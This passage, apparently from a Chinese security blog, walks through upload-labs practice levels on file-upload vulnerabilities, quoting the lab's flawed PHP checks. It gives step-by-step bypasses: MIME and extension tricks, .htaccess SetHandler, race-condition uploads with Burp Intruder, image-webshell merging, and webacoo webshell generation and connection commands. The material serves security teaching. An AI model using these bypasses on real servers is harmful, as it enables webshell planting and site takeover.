($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; &#x2F;&#x2F;使用上传的图片生成新的图片 $im &#x3D; imagecreatefromjpeg($target_path); if($im &#x3D;&#x3D; false)&#123; $msg &#x3D; &quot;该文件不是jpg格式的图片！&quot;; &#125;else&#123; &#x2F;&#x2F;给新图片指定文件名 srand(time()); $newfilename &#x3D; strval(rand()).&quot;.jpg&quot;; $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename; imagejpeg($im,$newimagepath); &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path &#x3D; $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &quot;上传失败！&quot;; &#125; &#125;else if(($fileext &#x3D;&#x3D; &quot;png&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; &#x2F;&#x2F;使用上传的图片生成新的图片 $im &#x3D; imagecreatefrompng($target_path); if($im &#x3D;&#x3D; false)&#123; $msg &#x3D; &quot;该文件不是png格式的图片！&quot;; &#125;else&#123; &#x2F;&#x2F;给新图片指定文件名 srand(time()); $newfilename &#x3D; strval(rand()).&quot;.png&quot;; $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename; imagepng($im,$newimagepath); &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path &#x3D; $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &quot;上传失败！&quot;; &#125; &#125;else if(($fileext &#x3D;&#x3D; &quot;gif&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; &#x2F;&#x2F;使用上传的图片生成新的图片 $im &#x3D; imagecreatefromgif($target_path); if($im &#x3D;&#x3D; false)&#123; $msg &#x3D; &quot;该文件不是gif格式的图片！&quot;; &#125;else&#123; &#x2F;&#x2F;给新图片指定文件名 srand(time()); $newfilename &#x3D; strval(rand()).&quot;.gif&quot;; $newimagepath &#x3D; $UPLOAD_ADDR.$newfilename; imagegif($im,$newimagepath); &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path &#x3D; $UPLOAD_ADDR.$newfilename; unlink($target_path); $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &quot;上传失败！&quot;; &#125; &#125;else&#123; $msg &#x3D; &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125;&#125; 上传流程准备一张GIF图片 先上传查看能否上传，成功上传 在命令行使用copy picture/d+ shell.php 2.gif来复制一张带有木马的图片，在进行上传 页面返回成功 打开二次渲染后的图片发现我们插入的&lt;?php phpinfo(); ?&gt;消失了 显然，这样的图片马上传方式失败了。 不过二次渲染会保留一些文件内容不会改变，所以在制作图片马之前，我们先观察二次渲染前后图片不会改变的地方，将其代码写入其中即可绕过二次渲染 经过对比，蓝色区域是不会改变的，在其中写入了&lt;?php phpinfo(); ?&gt;保存，再次进行上传 页面返回正常 打开图片查看是否有phpinfo()代码，查看是否被二次渲染掉，上传成功，并没有被渲染掉 不知这一种方法，还有就是自己写一个小代码，里面包含简易提交和一句话木马，将写入的代码二次渲染到图片上去，这样上传后可以直接在页面中查看是否返回成功 在页面中查看是否能返回phpinfo的页面，成功返回 upload-labs第十七关查看提示 代码分析代码审计，使用了unlink()函数删除文件。 这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可 12345678910111213141516171819202122232425262728$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); unlink($upload_file); $is_upload &#x3D; true; &#125;else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg &#x3D; &#39;上传失败！&#39;; &#125;&#125; 创建一个php文本文件 上传使用burp抓包发送的intruder模块进行clear$ 修改User-Agent将其Add$ 设置payloads选择Number，执行次数1000次 点击start attack进行攻击 攻击是在页面输入你之前上传的php文件名字，不断进行刷新 upload-labs第十八关查看提示 代码分析对文件后缀名做了白名单判断，然后检查文件大小、文件是否存在等等。 将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118&#x2F;&#x2F;index.php$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;]))&#123; require_once(&quot;.&#x2F;myupload.php&quot;); $imgFileName &#x3D;time(); $u &#x3D; new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName); $status_code &#x3D; $u-&gt;upload($UPLOAD_ADDR); switch ($status_code) &#123; case 1: $is_upload &#x3D; true; $img_path &#x3D; $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg &#x3D; &#39;文件已经被上传，但没有重命名。&#39;; break; case -1: $msg &#x3D; &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;; break; case -2: $msg &#x3D; &#39;上传失败，上传目录不可写。&#39;; break; case -3: $msg &#x3D; &#39;上传失败，无法上传该类型文件。&#39;; break; case -4: $msg &#x3D; &#39;上传失败，上传的文件过大。&#39;; break; case -5: $msg &#x3D; &#39;上传失败，服务器已经存在相同名称文件。&#39;; break; case -6: $msg &#x3D; &#39;文件无法上传，文件不能复制到目标目录。&#39;; break; default: $msg &#x3D; &#39;未知错误！&#39;; break; &#125;&#125;&#x2F;&#x2F;myupload.phpclass MyUpload&#123;.................. var $cls_arr_ext_accepted &#x3D; array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );.................. &#x2F;** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **&#x2F; function upload( $dir )&#123; $ret &#x3D; $this-&gt;isUploadedFile(); if( $ret !&#x3D; 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret &#x3D; $this-&gt;setDir( $dir ); if( $ret !&#x3D; 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret &#x3D; $this-&gt;checkExtension(); if( $ret !&#x3D; 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret &#x3D; $this-&gt;checkSize(); if( $ret !&#x3D; 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#x2F;&#x2F; if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists &#x3D;&#x3D; 1 )&#123; $ret &#x3D; $this-&gt;checkFileExists(); if( $ret !&#x3D; 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; &#x2F;&#x2F; if we are here, we are ready to move the file to destination $ret &#x3D; $this-&gt;move(); if( $ret !&#x3D; 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#x2F;&#x2F; check if we need to rename the file if( $this-&gt;cls_rename_file &#x3D;&#x3D; 1 )&#123; $ret &#x3D; $this-&gt;renameFile(); if( $ret !&#x3D; 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; &#x2F;&#x2F; if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); &#125;.................. &#125;; 页面代码显示补全在www目录下查看 因此也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。 upload-labs第十九关查看提示 分析代码黑名单策略，文件名用户可控，文件命名upload-19.php.绕过 123456789101112131415161718192021222324$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name &#x3D; $_POST[&#39;save_name&#39;]; $file_ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) &#123; $is_upload &#x3D; true; &#125;else&#123; $msg &#x3D; &#39;上传失败！&#39;; &#125; &#125;else&#123; $msg &#x3D; &#39;禁止保存为该类型文件！&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 选择one.jpg这个可上传的文件，在保存名称处改为php文件名，不能直接改为one.php因为php是不可上传的文件，以上代码使用黑名单但是没有过滤” . “点等，所以利用Windows的特性直接在文件名后面加上一个” . “点，返回空白图片，复制图片地址 当然不止这一种情况，可以不使用“ . ”直接使用空格也是可以的，因为使用了黑名单但是没有过滤，所以有很多绕过绕过情况 在新的页面打开并查看","categories":[],"tags":[]},{"title":"文件上传","slug":"文件上传","date":"2020-04-07T09:08:02.642Z","updated":"2020-04-08T08:50:33.461Z","comments":true,"path":"2020/04/07/文件上传/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"介绍文件上传漏洞现在web应用程序，上传文件一种常见功能，为了提高效率，允许用户上传图片，视频，头像和许多其他的文件。然而向用户提供的功能越多，web应用受到攻击的风险就越大，如果web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站权限，或者进一步危害服务器 1、为什么文件上传存在漏洞上传文件时，如果服务器代码没有对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式文件) 2、危害非法用户利用文件上传的恶意脚本控制整个网站，甚至控制服务器，这个恶意脚本文件被称为WebShell，也可以称之为”网页后门”，WebShell具有强大功能，比如查看服务器目录，服务器中的文件，执行系统命令等。 文件上传导致的常见安全问题 上传文件是Web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。 上传文件时Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为； 上传文件时病毒、木马文件、黑客用以诱骗用户或者管理者下载执行。 上传文件是钓鱼图片或为包含了脚本的图片，在某些版本中的浏览器会被作为脚本执行，被用于钓鱼和欺诈 文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件1、上传的文件能被web容器解析并执行，所以文件上传后所在的目录是要在web容器所覆盖的路径 2、用户能够从web上访问这个文件。如果文件上传了，但用户无法通过web访问，或者无法让web容器解析这个脚本，那么也不能称之为漏洞 3、用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功 绕过JS检测验证JS检测绕过上传漏洞常见于用户选择文件上传的场景，如果上传文件的后缀不被允许，则会弹窗告知，此时上传文件的数据包并没有发送到服务器端，只是在客户端浏览器使用JavaScript对数据包进行检测。 有两种方法可以绕过客户端JavaScript的检测 1）使用浏览器的插件，删除检测文件后缀的JS代码，然后上传文件即可绕过。 2）先把上传文件的后缀名改为允许上传的，比如：jpg、png、gif等，绕过JS检测，在用BurpSuite抓包，将原本的jpg文件改回php文件 查看界面 上传php文件看看能否上传，弹出了对话框，这表名验证点在前端，而不是在服务端 代码分析判断了验证点在前端，查看JS判断代码，F12找到判断代码 把代码抠出来整理 123456789101112131415161718192021function checkFile() &#123; var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; &#x2F;&#x2F;定义允许上传的文件类型 var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;; &#x2F;&#x2F;提取上传文件的类型 var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F;判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123; var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125;&#125; 可以看到，上传之前，通过JS判断一下文件后缀是否为.jpg|.png|.gif,不是就不允许上传 绕过方法对于前端js验证的绕过方法较为简单，我们可以将要上传的php文件改后缀名为jpg|png|gif,绕过js验证后，再用burp更改上传请求。或者浏览器禁用js后进行上传 现将文件名改为可上传格式，使用burp抓包改为php这样就可以绕过了 查看页面，返回空白图片说明成功 查看根目录 使用第二种方法，删除检查源码进行上传 按F12打开源码 删除红线处的内容onsubmit 提交内容，页面返回空白说明正确 查看根目录 可以使用菜刀连接 upload-labs第绕过MIME-Type验证MIME-Type介绍MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型，是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式 原理在客户端上传文件时，通过Burp Suite抓取数据包，当上传一个php格式的文件时，可以看到数据包中的 Content-Type的值是application/octet-stream，而上传jpg格式的文件时，数据包中的Content-Type的值是image/jpeg 如果服务器代码使用过Content-Type的值来判断文件的类型，那么就存在被绕过的可能，因为Content-Type的值使用过客户端传递的，是可以任意修改的，所以当传一个php文件的时候，在Burp Suite中将Content-Type修改为image/jpeg就可以绕过服务端的检测 注意：是通过客户端传递，服务端检测，是服务端检测验证MIME-Type代码分析MIME-Type验证并不是发生在客户端验证，而是发生在服务端验证 // $_FILES表示使用了$_FILES全局数组，主要作用就是进行文件操作，例如文件上传时，使用较多// upload_file是我们上传时的文件，也就是表单当中input-type=file对应有一个name，name属性的值用来接收$_FILES[‘upload_file’]这个文件，来调用第二维可以指定对应的type，来获取上传文件的MIME-Type类型 查看源码分析，使用$_FILE[‘uploda_file’] [‘type’]获取上传文件的MIME-Type类型，其中upload_file是在表中定义的 12345678910111213141516171819$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123;&#x2F;&#x2F; 判断文件类型，只有符合image&#x2F;jpeg或者image&#x2F;png才能成功成功上传 if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload &#x3D; true; &#125; &#x2F;&#x2F;当文件类型不是上面判断的类型就会报错 &#125; else &#123; $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; Burp Suite绕过MIME-Type验证使用burp抓包，更改Content-type的值 上传php文件Content-type的值是： 1Content-Type: application&#x2F;octet-stream 需要将Content-Type中的值改为image/jpeg等可以上传的格式 查看页面，页面返回空白，说明上传成功 查看根目录 可以使用菜刀连接 PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令1cat image.png wbeshell.php &gt; image.php 此时使用getimagesize()就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize()的限制。绕过黑名单验证基于文件后缀名验证介绍对于文件上传模块来说，尽量避免上传可执行的脚本文件。为了防止上传脚本需要设置对应的验证方式。最简单的就是设置文件后缀名验证 基于文件后缀名验证方式的分类： 1、机遇白名单验证：只针对白名单中有的后缀名，文件才能上传成功。 2、基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功 基于黑名单验证代码分析对于黑名单中的后缀名筛选。绕过黑名单可以通过寻找”漏网之鱼”，寻找某些可以被作为脚本执行同行也不再黑名单中 123456789101112131415161718192021222324252627if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; &#x2F;&#x2F; 设置了四个黑名单后缀名 $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;); &#x2F;&#x2F; 接收当前上传的文件名 $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); &#x2F;&#x2F; 接收之后进行并处理 $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空 &#x2F;&#x2F; 进行判断，如果文件名不在$deny_ext这个黑名单当中，进行上传。 if(!in_array($file_ext, $deny_ext)) &#123; &#x2F;&#x2F; 上传之后重命名，命名成跟时间以及随机数相关的内容，这样他就不是原名称，而是全新的名称 if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR. &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR .&#39;&#x2F;&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload &#x3D; true; &#125; &#x2F;&#x2F; 如果在黑名单当值，执行else，不允许上传 &#125; else &#123; $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; BurpSuite绕过黑名单验证不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他的任意后缀名的文件，比如说 1.phtml .phps .php4 .php3 这里黑名单也没有过滤.htaccess，所以也可上传.htaccess后缀的文件进行绕过。 注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All1.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。 配置文件http.conf在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride 默认情况下红框内会出现None，将None修改为All 这里绕过不使用.htaccess但是提前配置好，使用其他的几个没过滤的文件后缀 使用一下其中一个，当然不止这些扩展名，还有很多 1.phtml .phps .php4 .php3 上传php文件使用burp抓包 将shell.php改为shell.phps Forward放行，页面返回空白图片 右键选择复制图片地址在浏览器中打开，成功返回结果 绕过黑名单验证(.htaccess)upload-labs第四关 .htaccess文件介绍htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能 其中.htaccess文件内容： SetHandler application/x-httpd-php 设置当前目录所有文件都是用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当做PHP执行。不符合则报错 配置文件http.conf在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride 默认情况下红框内会出现None，将None修改为All 审计黑名单过滤代码1234567891011121314151617181920212223if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; &#x2F;&#x2F; 以下为黑名单，不允许的扩展名，对上传进行判定，判定如果在黑名单中，执行下面else，文件不允许上传 $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传!&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 在黑名单中，没有对.htaccess进行过滤，可以直接上传.htaccess来这是使用php解析任意文件。 .htaccess文件内容：SetHandler application/x-httpd-php 制作图片phpinfo探针并上传将SetHandler application/x-httpd-php复制到文本另存为.htaccess 页面进行上传，会返回一个空图片 复制图片链接，打开新的网址，会出现403，会显示 这说明你文件已经上传了，但是你没有权限去访问他 在上传一个图片，图片包含phpinfo探针 使用文本编写php代码 保存为1.jpg进行上传 复制图片地址在浏览器中打开 绕过黑名单验证(大小写绕过)upload-labs第五关 大小写绕过原理Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的 基于黑名单验证的代码分析1234567891011121314151617181920212223242526$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123;&#x2F;&#x2F; 黑名单中也没有大小写，例如：如果输入php会被过滤但是输入PhP就不会被过滤 if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); &#x2F;&#x2F; 过滤不包含大小写过滤 &#x2F;&#x2F; 将上传的文件去空格 $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 直接修改后缀名php上传文件件以上代码发现大P小h大P(PhP)并没有被过滤，直接修改文件后缀名为PhP进行绕过 文件后缀名不一定必须在BurpSutie截断的HTTP请求中修改，可以直接修改文件后缀名进行上传 用burp将后缀改为大写PHP即可 放行查看页面 查看根目录 WebaCoo上传WebshellWebaCoo生成Webshell：webacoo -g -o a.php 上传Webshell 连接Webshell：webacoo -t -u Webshell地址 在kali中使用webacoo新建一个a.php文件 将文件复制到本地文件中，将后缀名改为大小写结合的PhP 上传复制会返回空白图片，复制图片连接，在另一个页面打开这个地址 复制这个地址去kali连接webshell，使用webacoo -t -u “URL”命令 注意：在URL中，因为是从本地copy到kali中的，本地的靶场是127.0.0.1，但在kali中没有127.0.0.1 1webacoo -t -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;a.PhP&quot; 我们需要修改成本地地址打开cmd使用ipconfig查看当前地址，将127.0.0.1改为当前地址，出现这个页面就说明连接成功 使用ipconfig可以查看本地ip等等 绕过黑名单验证(空格绕过)空格绕过原理Winodws系统下，对于文件名中空格会被作为空处理，程序中的监测代码如果不能自动删除空格，这样就可以利用空格绕过黑名单 针对这样的情况需要使用Burpsuite截断HTTP请求之后，修改对应的文件名 添加空格 基于黑名单验证代码分析12345678910111213141516171819202122if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; 